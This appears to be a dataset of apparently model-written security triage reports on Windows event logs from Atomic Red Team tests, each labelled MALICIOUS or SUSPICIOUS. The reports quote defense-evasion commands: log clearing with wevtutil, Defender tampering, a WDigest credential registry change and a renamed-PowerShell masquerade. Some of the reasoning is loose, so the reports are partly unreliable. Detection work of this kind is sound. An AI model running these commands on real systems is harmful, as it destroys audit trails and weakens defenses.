   There is no specific PowerShell log entry available here to review, but `wevtutil.exe` clearing the PowerShell log indicates attempts to erase activities conducted through PowerShell, which aligns with typical behavior of an attacker using PowerShell to avoid detection.

5. **General Observation:**  
   The user `admin_test` is consistently involved in using high integrity level processes to clear logs and alter registry settings. The combination of these actions strongly suggests malicious activity, as an attacker often uses such tactics to maintain persistence, avoid detection, and cover their tracks.

### Assessment and Resolution:
- **Assessment:** The sequence of log clearing, registry modification disabling Defender logs, and high integrity level usage indicates actions attempting to hide malicious activity and potentially to carry out more serious attacks undetected.
  
- **Resolution: MALICIOUS:** The log entries contain clear indicators of malicious activity. Specifically, the repeated clearing of multiple event logs and the registry modifications disabling Windows Defender logging suggest activities that should be deemed as a security breach.

### Recommendations for Further Action:
1. **Immediate Incident Response:** Begin a detailed investigation into the actions of the user `admin_test` and assess whether their credentials have been compromised.
2. **Containment:** Temporarily disable the user account `admin_test` to prevent further unauthorized activities.
3. **System Audit and Recovery:** Conduct a system-wide audit to uncover any additional changes or malicious software installations.
4. **Strengthen Security Monitoring:** Re-enable logging capabilities, especially for security and PowerShell, and implement advanced threat detection mechanisms.
5. **Patch and Harden:** Ensure all systems are up to date and consider hardening configurations to prevent similar incidents in the future."
Add domain to Trusted sites Zone,"Based on the analysis of the provided logs, several indicators suggest potentially malicious activity. Below are the findings detailed per category of log entries:

1. **Security Log:**
   - Event ID `1102` indicates that the security log has been cleared. This action was performed by the user `admin_test`. This is a suspicious activity often associated with attempts to cover tracks as it indicates log deletion.

2. **PowerShell Log:**
   - Multiple PowerShell events (Event ID `600`) logged a script execution that modifies the Windows Registry to add entries associated with `bad-domain.com`. These events indicate potentially malicious PowerShell script activities designed to manipulate internet settings related to a suspicious domain, possibly indicating an attempt to compromise browser security settings.

3. **Sysmon Log:**
   - Multiple instances of process creation were recorded for activities involving `wevtutil.exe` with the purpose of logging clearing (seen with command lines like `""C:\\Windows\\system32\\wevtutil.exe\"" cl Security` for various logs).
   - The PowerShell process executed by `admin_test` demonstrates suspicious command line arguments to manipulate registry settings related to the domain `bad-domain.com`.

4. **System Log:**
   - Event ID `104` also indicates clearing of system logs, which is suspicious and aligns with techniques used to hide or erase traces of other activities.

**Assessment:**
- **Unusual PowerShell Activity:** The execution of scripts modifying the registry to associate with a potentially malicious domain suggests attempts to alter system settings which could facilitate further attacks.
- **Log Clearing:** The repeated clearing of logs through `wevtutil` especially by the user `admin_test` strongly indicates an intention to hide activities.
- **Privilege Escalation:** Use of SYSTEM level integrity and execution contexts for potentially malicious PowerShell commands and system utilities shows misuse of privilege, likely to perform unauthorized changes undetected.

Given the combination of these events that indicate log tampering/clearing, potential command control attempts via PowerShell, and unauthorized registry modification actions, there's a strong suggestive pattern of malicious activities.

**Resolution: MALICIOUS**
- Immediate actions should include isolating the affected host from the network.
- Conduct a thorough forensic investigation to determine the full scope and nature of the compromise.
- Review recent system changes, installed software, and network activity for additional indicators of compromise.
- Consider resetting administrative credentials and reevaluate user privileges to prevent further misuse.
- Increase monitoring and alerting for similar activities across other systems in the environment to mitigate spreading threats."
Tamper with Windows Defender ATP using Aliases - PowerShell,"Upon reviewing the provided log entries from the Windows host, several indicators suggest suspicious and potentially malicious activity. The following points highlight the key findings:

1. **Clearing of Event Logs**: 
   - System EventID 104, Sysmon, and Security logs show that logs were cleared by the user `admin_test`. This is often a tactic used by attackers to cover their tracks after malicious activity. The clearing of logs for PowerShell is particularly concerning.
   
2. **Suspicious PowerShell Command**:
   - A PowerShell script was executed with commands such as `Set-MpPreference -drtm $True`, which modifies Windows Defender preferences. Disabling security features using PowerShell can indicate an attempt to reduce the system's defensive capabilities, a common behavior observed during malicious activities.
   
3. **Use of `wevtutil` for Clearing Event Logs**:
   - The use of `wevtutil.exe` with command-line arguments like `cl System`, `cl Security`, and `cl Windows PowerShell` by a high-integrity level user (likely admin, leveraged by `admin_test`) to clear event logs is evident from the Sysmon logs. This further suggests an attempt to hide traces of activities.
   
4. **Privilege Escalation and Use of NTLM Authentication**:
   - The security log entry (EventID 4672) indicates that user `admin_test` was granted several privileges like `SeDebugPrivilege`, `SeSecurityPrivilege`, etc., which are high-level privileges that are not usually granted unless necessary. The user logged in using NTLM authentication (EventID 4624), which should be reviewed for legitimacy, especially in a large enterprise environment where more secure authentication methods (e.g., Kerberos) are standard.
   
5. **Windows Defender State Changed**:
   - Application logs indicate Windows Defender was set to `SECURITY_PRODUCT_STATE_SNOOZED`. This snooze can render the system more vulnerable to further attacks and suggests potentially malicious intent to disarm protective measures.
   
6. **System Time Tampering**:
   - Security and Kernel logs indicate potential system time changes around 09:25:55, which can be used to evade time-based detection mechanisms or log mismatches.

Overall, these activities are red flags indicating an attempt to hide potentially malicious activity and disable defensive mechanisms on the host system. The presence of both log-clearing actions and security feature modifications aligns with tactics often employed in an ongoing or preparatory stage of a cyber attack.

### Resolution
**MALICIOUS**: 
Given the evidence of log manipulation, security control tampering, and privilege escalation, the activities observed are consistent with a compromise. Immediate incident response actions should be taken, including isolating the affected system, conducting a thorough forensic analysis, and reviewing/watching other systems for similar log entries indicative of lateral movement within the network. Additionally, consider reverting changes made to Windows Defender and reviewing access logs to ensure no further exploitation activities occur."
Modify registry to store logon credentials,"Based on the analysis of the provided Windows event logs, I have identified several indicators of potentially malicious activity:

1. **Log Clearing Activities:**
   - Event Logs (Security Log Event ID 1102, System Log Event ID 104) show evidence of log files being cleared multiple times within milliseconds. This activity was performed by the user `admin_test`, and the `wevtutil.exe` utility was used to clear the logs. This is highly suspicious as attackers typically clear logs to cover their tracks post-compromise.

2. **Registry Manipulation:**
   - A command-line execution (Sysmon Event ID 1) with `cmd.exe` and `reg.exe` to add a registry key for `WDigest` use of LogonCredential is visible. This is a known technique used to activate credential theft via WDigest on older Windows versions and is highly indicative of malicious intent.

3. **Time Change Events:**
   - Multiple events indicate the system time was manipulated in quick succession (Security Log Event ID 4616, System Log Event ID 24, 1). While time manipulation could be legitimate under very specific circumstances, unauthorized or frequent changes might indicate an attempt to obfuscate the timeline of events.

4. **Frequent Use of `whoami.exe` and `hostname.exe`:**
   - These utilities were run multiple times by `admin_test`. Although not inherently malicious, frequent invocation can indicate reconnaissance activity within the system.

5. **Use of Remote Services and High-Integrity Level Processes:**
   - Multiple processes were running with high integrity levels, and actions were executed under the `SERVER002\admin_test` and `NT AUTHORITY\SYSTEM`. It suggests potentially elevated privileges and might be leveraged for lateral movements or privilege escalation.

Final Assessment:
Based on the above observations, the behavior captured in the logs strongly suggests indicators of compromise and malicious activity. The log clearing, registry manipulation indicative of credential theft, and unexpected high-integrity level processes by a presumably regular user raise significant security concerns.

**Resolution:** MALICIOUS

**Guidance:**
- Immediately investigate the user account `admin_test` for any unauthorized access or anomalies.
- Conduct a full forensic analysis of the system to determine the extent of the compromise.
- Review and audit account privileges and consider revoking unnecessary elevated access.
- Strengthen logging policies to prevent unauthorized clearing of logs.
- Continually monitor for similar patterns on other systems and ensure endpoint protection is robust against known techniques highlighted above."
Disable Windows Change Password Feature,"Upon a detailed analysis of the provided logs, several key observations stand out regarding potential suspicious or malicious activity:

1. **Time Manipulation**: The security log indicates a timestamp anomaly where the system time was changed (`EventID: 4616`). This can indicate an attempt by an attacker to cover their tracks, as time manipulation is a common tactic used to misalign the forensic timeline.

2. **Event Log Clearing**: The security log also shows an event (`EventID: 1102`) related to log file clearing by the user ""admin_test,"" which could indicate an attempt to hide actions on the machine. Log file clearing is often associated with malicious activities as it may be an effort to remove evidence.

3. **Registry Modifications**: The Sysmon logs capture the execution of `cmd.exe` and `reg.exe` where registry settings are altered to disable password changes (`CommandLine: ""cmd.exe"" /c reg add ... DisableChangePassword`). This type of modification to security-related registry settings without clear approval or a known scheduled task is often a red flag for malicious activities.

4. **Execution of `wevtutil.exe`**: The frequent execution of `wevtutil.exe` specifically to clear Windows Event logs is suspicious. `wevtutil` is a legitimate Windows tool but is also commonly used by attackers to clear or manipulate event logs.

5. **Tools Executed by High-Privilege Account**: Processes executed by ""SERVER002\\admin_test"" at a high integrity level suggest administrative privilege usage, which aligns with typical patterns of malicious activity when executed alongside suspicious commands like log clearance and registry modifications.

Considering this analysis, the findings indicate indicators of compromise:

- **Evidence of Potential Malicious Intent**: The combination of clearing logs, registry modification to impact security policies, time manipulation, and execution of administrative tasks suggests malicious intentions.

Therefore, the resolution for the provided event logs is: **MALICIOUS**

**Guidance on How to Proceed:**

- **Immediate Containment**: Isolate the affected machine to prevent further spread or data exfiltration.
- **Detailed Investigation**: Conduct a full forensic analysis to understand the extent of the compromise, including reviewing additional logs and memory analysis.
- **Remediation**: Remove any potential backdoors or malware, restore affected systems from backups, and change all account passwords, especially those with administrative privileges.
- **Monitor and Improve Security**: Enhance monitoring capabilities, enforce stricter access controls, and provide additional security training to users and administrators."

1. **Event Log Clearing:**
   - There are multiple instances of event logs being cleared, which can be seen in the following logs:
     - System log Event ID 104: Indicates that the ""System"" and ""Windows PowerShell"" logs were cleared by user ""admin_test.""
     - Security log Event ID 1102: Indicates that the ""Security"" log was cleared by the same user.
   - Log clearing is a common tactic used by malicious actors to cover their tracks after illicit activities.

2. **PowerShell Log Absence:**
   - The provided PowerShell log section is empty. This could be benign due to inactivity or suspicious if logs were deleted.

3. **Suspicious Process Execution:**
   - There is a notable execution of `cmd.exe` with a command line instruction to launch Notepad via `rundll32.exe pcwutl.dll,LaunchApplication`. Although Notepad execution by itself is benign, using `rundll32.exe` with `pcwutl.dll` is unusual and may indicate process masquerading or exploitation attempts.
   - `wevtutil.exe` (Eventing Command Line Utility) was used to clear logs: This aligns with the observations of log clearing - a common tactic to hide malicious activities.

4. **System Time Changes:**
   - The event logs indicate that system time was changed multiple times within a short period. This may point towards attempts to manipulate timestamps on logs or files. 

5. **Privilege Escalation:**
   - Event ID 4672 shows the assignment of specific high-level privileges to the user ""admin_test,"" including `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`, which are often required for low-level system changes and could be abused for malicious activities.

6. **Logon Sessions:**
   - Multiple logon events (Event ID 4624) for ""admin_test"" are observed, showing interactive logons, which require further verification to rule out unauthorized access attempts.

7. **Network Indicators:**
   - There is an external attempt to perform a logon using NTLM authentication, as indicated by the workstation name in the logon event.

8. **Background Activities:**
   - Several activities related to Microsoft Edge updates are observed. These appear to be legitimate system update activities and are not intrinsically suspicious in the context provided.

**Assessment and Guidance:**
- **Resolution: SUSPICIOUS.** The combination of log clearing, suspicious process executions, privilege escalation, and potential tampering with system time suggests potentially malicious activity.
  
**Recommendations for Action:**
- Further investigate the user ""admin_test"" for unauthorized access or suspicious activities.
- Verify the integrity of the DLLs and executables involved in suspicious activities (`wevtutil.exe`, `rundll32.exe`, `cmd.exe`).

Delete Microsoft Defender ASR Rules - InTune,"### Detailed Analysis

Upon reviewing the Windows event logs provided, several activities stand out as potential indicators of suspicious or malicious behavior.

#### Indicators:

1. **Log Clearing Activity:**
   - Multiple log clearing events were observed in the logs:
     - EventID 104 indicates that logs were cleared from the System channel and Windows PowerShell by the user ""admin_test"". 
     - EventID 1102 indicates that logs were cleared from the Security channel by the same user.
   - Clearing of logs can be a tactic used by an attacker or insider to hide traces of malicious activity.

2. **Command Execution (Suspicious PowerShell Activity):**
   - A PowerShell process was observed executing a script to manipulate registry settings related to Windows Defender.
   - The command modifies the registry path `HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Policy Manager` and adds a value under `ASRRules`. Such registry manipulations can be indicative of attempts to disable or alter security configurations, which might suggest malicious intentions.

3. **Privileges and Account Usage:**
   - The user ""admin_test"" was observed with privileged access, including privileges like SeDebugPrivilege, SeTakeOwnershipPrivilege, etc., commonly used during privilege escalations or sensitive operations, which bears examination in the context of other suspicious activities.
   - Series of successful logons with high privileges via NTLM continued showing evidence of having elevated tokens.

4. **Repeated Utilization of `wevtutil.exe`:**
   - Execution of `wevtutil.exe` to clear logs on multiple instances adds weight to the suspicion. This tool is often used in malicious operations to cover tracks.

5. **Time Change Events:**
   - Events 4616 indicate that the system time was changed. Although not always malicious, altering system time could be a tactic to manipulate timestamps on logs or manage time-based security mechanisms.

6. **Regular Updates and Routine Background Tasks:**
   - The logs also indicate regular system operations such as Microsoft Edge updates, which appear benign and expected as part of system maintenance.

### Assessment

Despite some benign entries related to system updates, the combination of evidence—log clearing, registry manipulation potentially disabling security features, the use of system tools (`wevtutil.exe`) to remove traces, and privileged operations—strongly indicate attempts of compromising system integrity or covering malicious activities.

Disable Windows Command Line Auditing using Powershell Cmdlet,"Upon reviewing the provided Windows event logs, several indicators of potentially suspicious activities are identified. Below is a detailed analysis highlighting these concerns:

### Key Findings

1. **Log Clearing Activities:**
   - The `Security` log indicates a log clearing action with Event ID 1102 (""LogFileCleared"") by the user `admin_test`. This is typically an alarming sign as attackers often clear logs to cover their tracks. The logs were cleared at ""2024-10-28 11:27:56"".

2. **Use of `wevtutil`:**
   - The `Sysmon` logs reveal multiple instances of `wevtutil.exe` being executed to clear logs across various channels (`Application`, `System`, `Security`, and `Windows PowerShell`). The command-line arguments used are indicative of log clearing actions, which align with the suspicious log clearing activities noted in the logs.

3. **Time Manipulation:**
   - Event ID 4616 from the `Security` log indicates a system time change by the `LOCAL SERVICE` on behalf of `svchost.exe`. While this could be benign, it warrants further investigation in context with other suspicious activities.

4. **PowerShell Script Execution:**
   - The `Windows PowerShell` and `Sysmon` logs note the execution of a PowerShell command to modify registry settings: disabling the auditing of process command line arguments. This change, executed by `admin_test`, is particularly concerning as it could be indicative of an attempt to obfuscate further malicious activities.

5. **Microsoft Edge Update Executions:**
   - Numerous instances of the `MicrosoftEdgeUpdate.exe` process executed under `NT AUTHORITY\SYSTEM`. While these could be legitimate updates for Microsoft Edge, they appear after the suspicious log and registry changes, and without additional context, these activities merit further scrutiny to rule out misuse or exploitation.

### Assessment

The logs exhibit a pattern consistent with potential malicious activities:
   - The clearing of several critical logs (`Security`, `System`, `Windows PowerShell`) shortly before a registry change to disable command line auditing.
   - Modifying system time, which could aid in evading detection in certain monitoring setups.
   - Execution of several wevtutil and PowerShell commands by the same user account (`admin_test`).

### Conclusion: **MALICIOUS**

The indicators above point towards an attempt at hiding malicious activity by clearing logs and modifying system configurations to disable further command-line argument auditing. It suggests that an actor with potentially malicious intent is manipulating the Windows host. Such activities require immediate action.

### Recommendations

1. Conduct a thorough investigation of `admin_test` account activities and any associated user credentials.
2. Assess the integrity of critical system files and installed applications to detect potential tampering.
3. Review network logs for any unusual outbound connections around the given timestamps.
4. Examine all changes to the system's registry and security settings for unapproved configurations.
5. Consider isolating the affected system to prevent potential lateral movement within the network.
6. Ensure proper log management and retention policies are reinforced to detect and prevent future log clearing attempts.

Immediate containment and eradication measures should be launched to address and mitigate the identified threats effectively."
Disable Remote Desktop Anti-Alias Setting Through Registry,"Upon analyzing the provided logs, several indicators of potentially malicious activities stood out:

1. **Clearing of Event Logs:**
   - There are multiple instances of using `wevtutil.exe` to clear event logs, including Security, System, Application, and Windows PowerShell logs. This behavior is often associated with malicious actors attempting to cover their tracks by erasing evidence of their activities.
   - Security Log event with EventID 1102 indicates that someone (user `admin_test`) has cleared the security event logs.

2. **Suspicious Registry Modification:**
   - A command executed by `cmd.exe` is modifying the registry key `HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows NT\Terminal Services` to disable Remote Desktop anti-aliasing. This specific modification could be suspicious as it alters system configurations, potentially for persistence or to modify RDP settings for malicious purposes. 

3. **Usage of Administrative Tools:**
   - The recurring use of `whoami.exe`, `wevtutil.exe`, and `reg.exe` are common utilities, but their combination in quick succession, particularly to clear logs and modify registry settings, suggests a pattern often seen in malicious activities. 
   - The execution context and integrity level (High) also indicate these actions were performed with elevated privileges.

Based on the analysis of the logs and the outlined suspicious activities, these indicators point towards deliberate attempts to execute unauthorized changes and conceal those actions. Thus, the assessment of the situation indicates malicious activity.

**Resolution: MALICIOUS**

**Guidance on how to proceed:**
- Immediate isolation of the host machine (Server002) from the network to prevent further spread of potential threats.
- Conduct a full forensic analysis to determine the extent of the compromise and identify other potentially affected systems.

Change Powershell Execution Policy to Bypass,"Based on the provided Windows event logs, I have conducted an analysis to identify any indicators of suspicious or malicious activity.

### Key Observations:

1. **Process Activities:**
   - Multiple events indicate the execution of the `wevtutil.exe` process with the command line to clear logs from various channels such as Sysmon, Security, Application, and Windows PowerShell. This is considered a red flag, as attackers typically clear logs to cover their tracks.
   - PowerShell was executed with the command to bypass execution policy which is commonly used for malicious activity or running non-standard PowerShell scripts.

2. **Log File Clearing:**
   - Numerous EventID 104 entries in the System log indicate log files were cleared. These actions were executed by the user `SERVER002\admin_test`. This event can be highly indicative of malicious activity when combined with the execution of `wevtutil.exe` to clear event logs.

3. **Privilege and Integrity Level:**
   - All processes of interest, such as `wevtutil.exe` and `powershell.exe`, were executed with a high integrity level, indicating administrative-level permissions.

4. **Unexpected Time Changes:**
   - A series of kernel events related to time changes were observed, but these are less concerning and could be part of routine time synchronization.

5. **Edge Update Activities:**
   - Extensive activity related to Microsoft Edge updates was logged. This activity appears normal and corresponds with routine update checks and installations, especially under `NT AUTHORITY\SYSTEM`.

### Assessment:

After reviewing the logs, the execution of `wevtutil.exe` to clear event logs and the usage of PowerShell with the execution policy bypass are the most notable suspicious activities. These suggest that someone or something was attempting to hide actions on the system, potentially indicating compromise or malicious intent.

### Conclusion:

**Resolution: MALICIOUS**

The activities suggest an attempt to cover tracks on the system, potentially indicating compromise. Immediate action should be taken to investigate the source of the log-clearing commands and the PowerShell usage. It is also advised to check for other signs of compromise on the system, such as unauthorized user accounts or unexpected network communications. Here are some recommended next steps:

1. **Quarantine the Host:** Isolate the affected system from the network to prevent further spread or data exfiltration.
2. **Forensic Analysis:** Conduct a detailed forensic analysis to understand the extent of the compromise.
3. **Review User Accounts:** Check for any unauthorized or suspicious user accounts or executions during the timeframe of the observed activity.
4. **Analyze Network Traffic:** Look for unusual outbound traffic from the host which might indicate data exfiltration.
5. **Enhance Logging:** Ensure all logs are being properly collected and monitored continuously to detect any further suspicious activities quickly.

By taking these corrective measures, the organization can work towards mitigating the potential risks associated with this malicious activity."
Create and start Hyper-V virtual machine,"Upon analysis of the provided Windows event logs, several indicators suggest suspicious activity, possibly of a malicious nature. Below is a detailed assessment:

### Suspicious or Anomalous Behavior:

1. **PowerShell Activity**: 
   - Continuous PowerShell logs record a PowerShell session starting new virtual machines (VMs), disabling secure boot, and booting the VMs (`New-VM`, `Set-VMFirmware`, `Start-VM`). 
   - Such actions can be legitimate but may also indicate VM creation for malicious use such as sandboxing or isolated environments for malware execution.

2. **Log Clearance Events**:
   - Log entries indicate the clearing of the System, PowerShell, and Security event logs by `admin_test`.
   - Log clearance, especially preceded by or followed by potentially suspicious activities, is indicative of attempts to cover tracks.

3. **Process Executions**:
   - Several `wevtutil.exe` executions are logged, specifically targeting clearance of event logs (`""wevtutil.exe"" cl System`, `""wevtutil.exe"" cl Security`, `""wevtutil.exe"" cl ""Windows PowerShell""`).
   - This tool is commonly used for log management, but in this context, it strongly suggests deliberate log tampering.

4. **Unauthorized Program Usage**:
   - Commands such as `hostname.exe`, `whoami.exe` reflect querying operations, which might be part of an enumeration phase within an unauthorized context.

5. **Time Synchronization**:
   - NTP events indicate time synchronization. However, without context on whether the time was manipulated internally, it's not inherently suspicious, but worth noting in combination with other activities.

### Potential Malicious Indicators:

- The deliberate sequence of actions: launching PowerShell to execute VM commands, followed by log clearance activities, suggests a controlled and planned operation possibly hiding anomalous or unauthorized activity.
- Use of high-integrity PowerShell sessions and administrative accounts (`SERVER002\\admin_test`) for executing tasks like VM creation and event log clearance highlights potential misuse of elevated privileges.

### Conclusion:

Considering the outlined suspicious activities and techniques that align with typical attack vectors (e.g., PowerShell abuse, log clearance), the logs point towards **SUSPICIOUS** activity. Although not all evidence is conclusively malicious without further context or behavioral correlations, the actions warrant an in-depth investigation.

### Guidance on Proceeding:

1. **Immediate Actions**:
   - Isolate the affected machine (Server002) for a comprehensive forensic analysis.
   - Check for additional IOCs (Indicators of Compromise) such as unusual network patterns or unauthorized access attempts.

2. **Investigation**:
   - Conduct memory analysis on the VMs and the host.
   - Review additional related logs (Network, Firewall) for corroborating malicious activities.

3. **Account Scrutiny**:
   - Investigate the `admin_test` account for unauthorized access or any indications of compromise.
   - Implement additional monitoring on privileged accounts.

4. **Mitigation**:
   - Consider resetting credentials associated with identified suspicious accounts.
   - Strengthen PowerShell logging and monitoring.

The combination of suspicious log clearances, VM operations, and invoked system utilities reflect behavior that is atypical in benign environments and deserves further scrutiny to rule out or confirm potential compromise."
CMSTP Executing Remote Scriptlet,"Based on the analysis of provided Windows event logs, here are the key points and findings:

### Observations:

1. **Clearing Event Logs:**
    - **System, Windows PowerShell, and Security Logs Cleared:** Multiple logs show events for clearing the System (Event ID 104), Windows PowerShell, and Security (Event ID 1102) logs by the user `SERVER002\admin_test`. These actions are typically associated with efforts to cover tracks after malicious activity, often a sign of compromise.
  
2. **Use of `cmstp.exe`:**
    - **Execution of `cmstp.exe`:** There is an instance of `cmd.exe` running with the command to execute `cmstp.exe` with a specific INF file from the `AtomicRedTeam` directory. Atomic Red Team is known for providing security testing capabilities. The same command was repeated multiple times in quick succession.
  
3. **Frequent Execution of System Utilities:**
    - **Commands like `wevtutil.exe`, `hostname.exe`, `whoami.exe`:** These utilities were executed multiple times, suggesting possible investigation or enumeration activities on the system.
  
4. **Microsoft Edge Update Activity:**
    - **Multiple Edge Updates Executed by SYSTEM:** There are numerous logs relating to the update of Microsoft Edge, executed with SYSTEM privileges. The nature of the logs does not immediately indicate malicious activity inherently; it could be a legitimate task but warrants attention since updating processes were triggered in near conjunction with log clearing events.

### Assessment:

The logs have clear indicators of potentially malicious behavior:

- The clearing of critical Windows logs (System, Security, and PowerShell) is a significant warning sign, typically considered part of the ""kill chain"" in cyber attacks to eliminate traces.
- The `cmstp.exe` tool usage linked to the AtomicRedTeam suite is used for testing security controls and could potentially be used to bypass User Account Control (UAC) via misconfiguration.
  
These indicators are strong enough to classify the behavior as **malicious**, pending further investigation.

### Threats and Risks:

- **Potential Compromise:** There are signs that the system might have been compromised, specifically targeting logs to prevent detection of nefarious activities.
- **Privilege Escalation Risks:** The use of `cmstp.exe` with the mentioned INF file could indicate an attempt to gain a higher privilege.

### Guidance on Proceeding:

1. **Immediate Response:**
   - Quarantine the affected system to prevent further spread or actions by an attacker.
   - Collect and analyze memory dumps and additional forensic evidence if available.
   
2. **Deep Investigation:**
   - Check for any unauthorized scheduled tasks or persistent mechanisms.
   - Inspect the content of INF file(s) and determine their intent.
   - Review any file changes or access patterns around the time logs were cleared.

3. **Long-term Mitigation:**
   - Implement stricter controls and monitoring for event log tampering.
   - Consider user education on security best practices and review privileged account usage.
   - Validate and reconfigure any potentially vulnerable settings or software configurations, especially concerning UAC.

In summary, the log activity should be classified as **MALICIOUS** based on the events concerning log clearing, suspicious command execution, and attempts to obfuscate actions."
Suppress Win Defender Notifications,"Based on the provided Windows event logs, here is a detailed analysis focusing on potential indicators of malicious activity:

1. **Security Event Log**:
   - **Event ID 1102 (Log Cleared)**: This event indicates that the security log was cleared by the user ""admin_test"". Clearing logs is often associated with attempts to cover tracks, which is suspicious behavior that warrants further investigation.
   - **Event ID 4672 (Admin Logon with Special Privileges)**: The user ""admin_test"" logged on with high privileges including SeDebugPrivilege and SeLoadDriverPrivilege, which can be leveraged for malicious actions. This can be normal for administrative users, but when combined with log clearing, it raises concerns.
   - **Time Anomaly Events (Event ID 4616)**: There are entries adjusting the system time backward. This can be a tactic used to evade detection mechanisms that rely on time-based metrics.

2. **Sysmon Log**:
   - **Wevtutil.exe Execution**: Multiple executions of ""wevtutil.exe"" command-line utility for clearing event logs for channels such as Security, Application, and System. This further corroborates the attempt to clear logs and indicates deliberate intentions to erase traces of activity.
   - **Cmhost.exe and Reg.exe Execution**: The sequence of ""cmd.exe"" running ""reg.exe"" with a command to modify Windows Defender notification settings suggests potential attempts to alter security settings, which is suspicious. 
   - There are unusual spikes of activity involving utilities like ""hostname.exe"" and ""whoami.exe,"" which in isolation may be benign but appear as part of a pattern to gather system information.

3. **Application Log**:
   - **No significant malicious patterns**: The application log primarily shows expected behavior around the EdgeUpdateApp, which is typical for Windows systems updating software.

4. **System Log**:
   - **Event ID 104 (Log Cleared)**: Similar to the Security log clearing, these entries show the system event logs being cleared by the same user ""admin_test.""

**Assessment and Resolution**:
Given the combination of log-clearing activities, execution of elevation/administration tools, and modification of system settings (e.g., Windows Defender registry change), there are clear indicators of potentially malicious behavior, possibly suggesting a compromise. The use of standard system tools (e.g., wevtutil.exe) in a way that aligns with attempts to conceal activities further strengthens this suspicion.

- **Resolution**: **MALICIOUS**
- **Guidance**: Immediate action is recommended, including:
  1. Isolating the affected host from the network to prevent further damage or data exfiltration.
  2. Conduct a thorough forensic investigation to identify the root cause, involvement of additional hosts, and scope of compromise.
  3. Check user ""admin_test"" for unauthorized configurations or access credentials.
  4. Review and enhance logging and monitoring policies to prevent future breaches and ensure detection of similar activities.
  5. Review system security settings, especially around use of administrative privileges, registry changes, and log management practices."
Masquerading - powershell.exe running as taskhostw.exe,"**Detailed Analysis of the Windows Event Logs:**

### Suspicious or Anomalous Behavior:

1. **PowerShell Logs:**
   - The PowerShell logs indicate that `taskhostw.exe` was executed from `C:\\Users\\admin_test\\AppData\\Roaming\\`. This is unusual because `taskhostw.exe` is typically run from the `C:\\Windows\\System32\\`. The use of a seemingly innocuous executable to run PowerShell might indicate an attempt at process hiding or privilege escalation.

2. **Sysmon Logs:**
   - There are entries indicating execution and process creation involving `taskhostw.exe` and `cmd.exe` where the command line includes the copying of `powershell.exe` to `taskhostw.exe`:
     ```
     ""cmd.exe"" /c copy %windir%\\System32\\windowspowershell\\v1.0\\powershell.exe %APPDATA%\\taskhostw.exe /Y & cmd.exe /K %APPDATA%\\taskhostw.exe
     ```
   - This suggests an attempt to create a renamed copy of PowerShell that could be utilized without raising immediate suspicion, a common tactic used to evade detection.

3. **System and Security Logs:**
   - There are multiple log clearance events (`EventID: 104` and `EventID: 1102`), with `admin_test` clearing logs. This is a highly suspicious action as attackers often clear logs to remove evidence of their activities.
   - Privilege escalation through `SeDebugPrivilege` and similar permissions shown in logs (EventID: 4672) for `admin_test`.

4. **Overall Timeline:**
   - The malicious behavior seems to be orchestrated around the same timeframe, indicated by process executions and log clearances occurring consecutively.

### Indicators of Malicious Activity:

- **Execution of PowerShell with Suspicious Applications:**
  - Utilizing `taskhostw.exe` to run PowerShell scripts is anomalous and potentially risky.
  
- **Log Clearing:**
  - The clearing of windows logs, especially by a user `admin_test`, is a critical indicator of malicious activity aimed at erasing tracks.
  
- **Process Creation:**
  - The recreation of PowerShell as `taskhostw.exe` under `AppData`, alongside cmd.exe call chaining, looks like a technique to bypass application whitelisting.

### Risk and Threat Assessment:

- **Privilege Escalation and Persistence:**
  - There is potential for compromised user credentials (`admin_test`) or misuse by an insider.
- **Log Tampering and Evidence Destruction:**
  - Actions taken suggest attempts to hide or cover tracks, indicative of a deliberate attack.
- **System Integrity Risk:**
  - The behavior noted indicates unauthorized attempts to maintain persistence, possibly through compromised scheduled tasks or script execution.

### Resolution:

- **MALICIOUS:**
  - The presence of process execution anomalies, coupled with log clearance of critical logs by `admin_test`, and the modification of expected application paths, suggests a likely compromise of the host.

### Guidance on How to Proceed:

1. **Immediate Actions:**
   - Isolate the affected machine from the network to prevent any potential spread.
   - Conduct a full malware scan on the system using updated antivirus software.
   - Review and possibly reset the credentials for `admin_test` and any other potentially affected accounts.

2. **Further Investigation:**
   - Conduct a review of other systems for similar patterns of behavior.
   - Investigate possible entry vectors, such as phishing, drive-by downloads, or insider threats.

3. **Long-term Measures:**
   - Implement enhanced logging and monitoring solutions to better track user activities and any anomalous behavior.
   - Educate users on cybersecurity practices to prevent similar issues in the future."

Invoke-ATHRemoteFXvGPUDisablementCommand base test,"Here's a detailed analysis of the log entries provided:

### Summary
1. **Security Log**
   - The log indicates that the event logs have been cleared multiple times within a short period. Specifically, the `Microsoft-Windows-Eventlog` event ID 1102 signifies that the security log was cleared by `admin_test` on `Server002`. This could indicate an attempt to cover tracks, which is a common post-compromise activity.
   - Multiple instances of `CompatTelRunner.exe` (part of Windows Telemetry) are seen querying various account-related groups (event ID 4798). While this can be normal depending on system configurations, it stands out because it follows the log clearance events closely.

2. **System Log**
   - Logs related to the clearing of the system and PowerShell logs are observed (event ID 104), executed by `admin_test`. This further solidifies the suspicion of obfuscation attempts.

3. **Sysmon Log**
   - The Sysmon logs reveal that `wevtutil.exe` was executed multiple times with the command to clear logs across various channels such as `Security`, `System`, and `Windows PowerShell`. This is a clear indication of manipulation of Windows event logs.
   - Execution of PowerShell with a suspicious command, `Invoke-ATHRemoteFXvGPUDisablementCommand`, which is not a standard PowerShell commandlet or function, suggesting potentially malicious actions using PowerShell.

4. **PowerShell Log** 
   - It confirms the PowerShell command execution consistent with the Sysmon logs. An execution context involving a script or command, `Invoke-ATHRemoteFXvGPUDisablementCommand`, is noted. Its nature suggests the possibility of a custom or potentially harmful script executing on the system.

### Conclusion
- The combination of event log clearing and suspicious PowerShell activity collectively indicates malicious behavior.

### Resolution
- **MALICIOUS**: The logs suggest system compromise with a strong likelihood of malicious intent. The multiple log clearance events performed using `wevtutil.exe` and the execution of suspicious PowerShell commands point to attempts at maintaining persistence and covering tracks on the host machine.

### Recommendations
1. **Immediate Incident Response**: Given the evidence of potential compromise, initiate an incident response procedure immediately. This should include isolating the affected system from the network.
2. **Full Forensic Analysis**: Conduct a detailed forensic analysis of `Server002` to determine the extent of the compromise and identify any potentially malicious artifacts or persistence mechanisms.
3. **Review Access and Permissions**: Evaluate user access and role permissions, especially for the `admin_test` account, to ensure minimal privilege principles are maintained.
